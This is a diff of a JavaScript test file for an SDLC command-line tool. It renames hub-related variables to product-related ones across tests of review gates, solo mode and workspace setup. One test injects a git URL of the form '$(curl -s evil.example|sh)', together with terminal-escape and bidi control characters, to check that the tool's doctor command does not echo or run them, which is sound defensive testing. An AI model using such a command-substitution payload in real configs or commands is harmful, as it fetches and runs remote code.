   // No ledger at all: the action is to author the `epic` step, so it names whatever runs that step.
@@ -16823,7 +16823,7 @@ test('nextAction names the bound skill for every kind of action it resolves', ()
   const disc = nextActionE6({
     state: { epicId: 'EP-discovery', kind: 'discovery', currentStep: 'discovery',
       steps: [{ id: 'discovery', type: 'author', artifact: 'discovery/', status: 'in_progress' }] },
-    hubPrs: [],
+    productPrs: [],
   }, { epic: 'EP-discovery', bindings });
   assert.equal(disc.skill, 'disc');
 
@@ -17569,7 +17569,7 @@ test('featureStatus: planned, in-shape, in-build and shipped come from the ledge
   const shape = { epicId: 'EP-a', currentStep: 'architecture', steps: [step('epic', 'author', 'done'), step('epic-review', 'review+approve', 'done'), step('architecture', 'author', 'in_progress')] };
   const built = { epicId: 'EP-a', currentStep: 'ready-for-build', steps: [step('epic', 'author', 'done'), step('epic-review', 'review+approve', 'done')] };
   const lane = (done) => ({ currentStep: 'engineer-review', steps: [{ id: 'spec', status: 'done' }, { id: 'engineer-review', status: done ? 'done' : 'in_progress' }] });
-  const L = (state, buildStates = []) => ({ state, approvals: [], comments: [], hubPrs: [], buildStates });
+  const L = (state, buildStates = []) => ({ state, approvals: [], comments: [], productPrs: [], buildStates });
   assert.equal(featureStatus(L(null)), 'planned');
   assert.equal(featureStatus(undefined), 'planned');
   assert.equal(featureStatus(L(shape)), 'in-shape');
@@ -17611,7 +17611,7 @@ test('featureStatus: shipped needs every story the epic has, and every repo each
     { id: 'epic', type: 'author', artifact: 'epic.md', status: 'done', risk_tags: [] },
     { id: 'epic-review', type: 'review+approve', artifact: 'epic.md', status: 'done', risk_tags: [] }] };
   const done = { currentStep: 'engineer-review', steps: [{ id: 'spec', status: 'done' }, { id: 'engineer-review', status: 'done' }] };
-  const L = (buildStates) => ({ state: built, approvals: [], comments: [], hubPrs: [], buildStates });
+  const L = (buildStates) => ({ state: built, approvals: [], comments: [], productPrs: [], buildStates });
   const onlyS01 = L([{ story: 'EP-a-S01', repos: { api: done } }]);
   const stories = [{ id: 'EP-a-S01', repos: ['api'] }, { id: 'EP-a-S02', repos: ['web'] }];
   assert.equal(featureStatus(onlyS01), 'shipped', 'with no stories to compare, the lanes on disk are all there is');
@@ -21273,8 +21273,8 @@ test('E108 FLIPS THIS — E72 gate sync: with enough people nothing is capped, t
 test('E72 gate sync: solo mode records no cap — nothing was counted, so nothing was lowered', async () => {
   const { T, ep } = scaffoldEpic();
   try {
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     const none = { ok: true, state: 'merged', merged: true, headOid: 'a', reviews: [], threads: [] };
     await captureConsole(() => gateSync(T, { epic: 'EP-test', today: '2026-06-09', reader: () => none, headCount: e72Count(2) }));
     const step = JSON.parse(fs.readFileSync(path.join(ep, '.sdlc/state.json'))).steps.find((x) => x.id === 'architecture-review');
@@ -21441,8 +21441,8 @@ test('E72 review: solo mode PRINTS a cap that lowered the ask', async () => {
   assert.deepEqual([solo.cap.capped, solo.cap.to, solo.short, solo.passed], [true, 1, 0, true]);
   const { T } = scaffoldEpic();
   try {
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     const none = { ok: true, state: 'merged', merged: true, headOid: 'a', reviews: [], threads: [] };
     const { out } = await captureConsole(() => gateSync(T, { epic: 'EP-test', today: '2026-06-09', reader: () => none, headCount: e72Count(2) }));
     assert.match(out, /capped to 1: 2 active people, less one seat for the author — base enforced, risk step advisory/);
@@ -21910,8 +21910,8 @@ test('E73 gate status: prints under open steps only — once each — and never 
     assert.match(named.out, /! may not be met: 1 of the 2 people counted is not matched to a platform login/, 'the status view passes the real `nameOnly` in');
     const approvedBefore = await captureConsole(() => gateStatus(T, { epic: 'EP-test', headCount: e73Count(2, 1, 1) }));
     assert.doesNotMatch(approvedBefore.out, /! may not be met/, 'the status view passes the real approvers in');
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     const solo = await captureConsole(() => gateStatus(T, { epic: 'EP-test', headCount: e73Count(1, 0) }));
     assert.doesNotMatch(solo.out, E73_LINE, 'solo mode counts nothing, so nothing is said');
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
@@ -21989,8 +21989,8 @@ test('E73 silent paths: an unknown count and solo mode print nothing, and a warn
     const warned = await captureConsole(() => gateSync(T, { epic: 'EP-test', today: '2026-06-09', reader: () => open, headCount: e73Count(1, 0) }));
     assert.match(warned.out, /may not be met/, 'this run did warn');
     assert.deepEqual(ledger(), quiet, 'and wrote nothing the silent run did not');
-    const hubFile = path.join(T, '.sdlc/hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true }));
+    const productFile = path.join(T, '.sdlc/hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true }));
     const solo = await captureConsole(() => gateSync(T, { epic: 'EP-test', today: '2026-06-09', reader: () => open, headCount: e73Count(1, 0) }));
     assert.doesNotMatch(solo.out, E73_LINE, 'solo mode counts nothing');
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
@@ -22015,8 +22015,8 @@ const E74_UNKNOWN = { today: '2026-06-09', unknown: ["repo 'backend' has no loca
 const E74_TAIL = 'so more than one person may work on this Product. If so, `yad mode team` makes each review gate ask for approvals, which solo mode waives';
 const E74_LINE = /solo mode is on, but .* may work on this Product/;
 const e74Solo = (T) => {
-  const hubFile = path.join(T, '.sdlc/hub.json');
-  fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), solo: true, mode: 'solo' }));
+  const productFile = path.join(T, '.sdlc/hub.json');
+  fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), solo: true, mode: 'solo' }));
 };
 
 test('E74 teamHint: the smallest possible team of 2 or more speaks; one login and one name does not', () => {
@@ -25858,8 +25858,8 @@ test('E79: new → push → join rebuilds the workspace, reports bad entries, in
     e79Git(T, backend, 'push', '-q', 'origin', 'main');
     // The team ignores its skill copies, and runs verified (so the per-clone git hook applies).
     fs.writeFileSync(path.join(product, '.gitignore'), '.claude/\n');
-    const hubFile = path.join(product, '.sdlc', 'hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(hubFile, 'utf8')), platform: 'github', ledger: 'verified' }));
+    const productFile = path.join(product, '.sdlc', 'hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(productFile, 'utf8')), platform: 'github', ledger: 'verified' }));
     fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [
       { name: 'backend', path: '../backend', git_url: path.join(remotes, 'backend.git'), platform: 'github', default_branch: 'main' },
       { name: 'escape', path: '../../outside', git_url: path.join(remotes, 'backend.git') },
@@ -26802,15 +26802,15 @@ test('E81 review 14: doctor builds no login command from a hub host that is not 
     fs.mkdirSync(bin);
     fs.writeFileSync(path.join(bin, 'gh'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
     const env = { PATH: `${bin}:${process.env.PATH}` };
-    const hubFile = path.join(product, '.sdlc', 'hub.json');
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', git_url: '$(curl -s evil.example|sh):o/r', mode: '\u009b31m\u202e',
+    const productFile = path.join(product, '.sdlc', 'hub.json');
+    fs.writeFileSync(productFile, JSON.stringify({ platform: 'github', git_url: '$(curl -s evil.example|sh):o/r', mode: '\u009b31m\u202e',
       roster: [{ name: '\u001b[2JX', login: 'a' }, { name: '\u001b[2JX', login: 'b' }] }));
     const doc = e79Yad(T, product, ['doctor'], env);
     const out = doc.stdout + doc.stderr;
     assert.doesNotMatch(out, /curl/, 'the host is never repeated');
     assert.match(out, /auth check skipped — the hub's git remote URL names a host that is not a plain host name/);
     assert.ok(!hasRaw(out), 'no raw control character');
-    fs.writeFileSync(hubFile, JSON.stringify({ platform: '\u001b[31mEVIL\u202e' }));
+    fs.writeFileSync(productFile, JSON.stringify({ platform: '\u001b[31mEVIL\u202e' }));
     assert.ok(!hasRaw(e79Yad(T, product, ['doctor'], env).stdout));
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
 });
